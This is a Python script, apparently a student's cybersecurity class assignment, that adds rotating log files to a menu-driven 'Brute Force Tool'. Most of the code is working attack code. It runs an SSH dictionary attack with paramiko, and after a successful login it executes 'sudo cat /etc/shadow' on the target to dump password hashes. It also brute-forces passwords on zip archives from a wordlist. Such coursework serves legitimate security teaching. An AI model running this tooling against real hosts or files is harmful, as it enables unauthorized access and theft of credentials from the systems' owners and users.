#!/usr/bin/python3

# Script: Ops 401 Class 27 script
# Author: Paul Stroud
# Date of latest revision: 05/23/23
# Purpose: Event Logging Tool Part 2 of 3
# Resources used: google, stackoverflow, github demo, chatgpt

# MAIN REQS:
# On the Python tool you added logging capabilities to:
#   Add a log rotation feature based on size


import zipfile  # for working with zip files

import sys      # for args and sys.exit() to kill the script
import time     # for time.sleep() timeout

import paramiko # for SSH connections and remote execution

import logging, logging.handlers  # for log mgmt

log_on = 1  # global var  to switch logging on/off
log_status = { 0:"DISABLE", 1:"ENABLE" }  # dict to store logging states

# configure log file, message format, and verbosity
logging.basicConfig(format='%(asctime)s: %(levelname)s:\t%(message)s', 
                    datefmt='%Y%m%d.%H%M%S', 
                    level=logging.DEBUG)

lumber = logging.getLogger()  # log object
roller = logging.handlers.RotatingFileHandler('401.27.log', maxBytes=1000, backupCount=3)
lumber.addHandler(roller)

### FUNCTIONS ####


# print string to stdout and log according to instructions
def print_log(str, log, lvl):  # new def to allow for variable log object and log level
    print(str)
    getattr(log, lvl)(str)     # add log entry with the level defined by lvl
   

# SSH connect to <host> on <port> using <username>:<pw>
def connect_ssh(host, username, pw, port=22):
    print(f"[{username}@{host}] Trying password '{pw}':   ", end="")
    
    # set up an SSH client object
    ssushi = paramiko.SSHClient()
    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)  
    
    try:  # attempt connection
      ssushi.connect(host, port, username, pw)  # attempt connection with given credentials
      print("SUCCESS!") # boom
      return ssushi     # return connection handle
    
    except paramiko.AuthenticationException:  # bad login
      print("fail")
      return None

    except KeyboardInterrupt:   # Ctrl+C interrupt
      print("\nStopped by user. Exiting...")
      print_log("Execution stopped by user. (Ctrl+C)", lumber, 'critical')
      sys.exit()

   

#### MAIN ####


try:    # grab parameters from script arguments
    wordlist = sys.argv[1]  # dictionary file
except: # incorrect number of args
    print("Please provide a wordlist file as the argument to this script.\n" \
          "Exiting...")
    print_log("No wordlist file provided.", lumber, "error")
    sys.exit()


# menu loop
while True:
    time.sleep(1)
    print("\n>>> Brute Force Tool v3.0 <<<")
    print("Select the operation to perform:" \
          f"\n\t1. SSH Dictionary Attack" \
          f"\n\t2. Password Lookup" \
          f"\n\t3. Brute force a zip file" \
          f"\n\t4. Enable/disable logging" \
          "\n\t0. Exit")

    op = -1  # holds user input
    while not (op >= 0 and op <= 4):
      try:
         op = int(input("Enter a menu option (0-4): "))
      except KeyboardInterrupt:   # Ctrl+C
         print()
         sys.exit()
      except: # catch all for anything other than menu options or Ctrl+C
         print("Invalid input. Please try again.")

    if op == 0:
      print("Exiting the script...")
      print_log("Script completed successfully", lumber, "info")
      sys.exit()  # kill the script
    else:
      
      if op == 4:   # turn logging on/off
        print(f"Logging is currently {log_status[log_on]}D")
        sw = ""   # var to switch on/off
        while (sw != 'y' and sw != 'n'):  # grab user input
             sw = input(f"Enter y/n to {log_status[1-log_on]} logging: ")
        log_on = log_on if sw == "n" else 1-log_on   # switch log setting if 'y'
        if (sw == 'y'):
          new_level = logging.NOTSET if log_on else logging.CRITICAL  # assign correct logging level
          logging.disable(new_level)  # disable all logging at new_level and above; NOTSET enables all
          print(f"Logging is now {log_status[log_on]}D")
        


      if op == 1:   # password iterator
        ip = input("Enter target IP: ")
        user = input("Enter username for SSH login: ")

        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
               ssh = connect_ssh(ip, user, pw.strip())  # try pw for SSH login
               if (ssh != None):  # valid SSH socket?
                  try:
                      print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                      # execute remote command to grab pw hashes
                      ssh_in, ssh_out, ssh_err = ssh.exec_command("sudo cat /etc/shadow | grep -v -e '*' -e '!' | awk -F ':' '{ print $1 \"\t\"  $2 }'")
                      print(ssh_out.read().decode("ASCII")) # decode as ASCII and dump to stdout
                      print("^^^ END OF HASHES ^^^")
                  
                  except Exception as exc:  # it's broken
                      print_log(f"Error retrieving password hashes. Exception: {exc}", lumber, "error")
                  
                  break   # exit the loop after finding the right password

               time.sleep(1)  # delay before trying the next pw
        except FileNotFoundError: print_log(f"File {wordlist} does not exist", lumber, "error") 
           

      if op == 2:   # password lookup
        test = input("Input the password to look up: ")
        print(f"Looking for {test} in {wordlist}:")
        i = 0   # line counter
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:
               pw1 = pw.strip()
               i += 1
               if (test == pw1):
                 print_log(f"MATCH FOUND!   Line {i}: {test} - {pw1}", lumber, "info")
        except FileNotFoundError: print_log(f"File {wordlist} does not exist", lumber, "error")

      if op == 3:   # brute force a zip file
        zip = input('Enter the zip archive to open (default = "test.zip"):')
        zip = "test.zip" if zip == "" else zip
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
              pw1 = pw.strip()  # extract the actual password (remove leading/trailing characters)
              print(f"   {zip}:{pw1}", " " * (15 - len(pw1)), ">   ", sep="", end="")  # pad spaces for up to 15 chars
              try:
                  # attempt to extract files using the pw from wordlist
                  var = zipfile.ZipFile(zip).extractall(pwd=bytes(pw1, "UTF-8"))
                  # if no exceptions thrown, we are good!
                  print("SUCCESS")
                  print_log(f"Found password for {zip}:\t{pw1}", lumber, "info")
                  break # stop iteration
              except Exception as exc:
                  # exception: first two words are "bad password"?
                  if (exc.args[0].split(' ')[0:2] == [ 'Bad', 'password' ]):
                    print("fail")
                  # for any other exceptions
                  else: print_log(f"Unknown error opening {zip}", lumber, "error")
        except FileNotFoundError: print_log(f"File {wordlist} does not exist", lumber, "error")
        
# end of script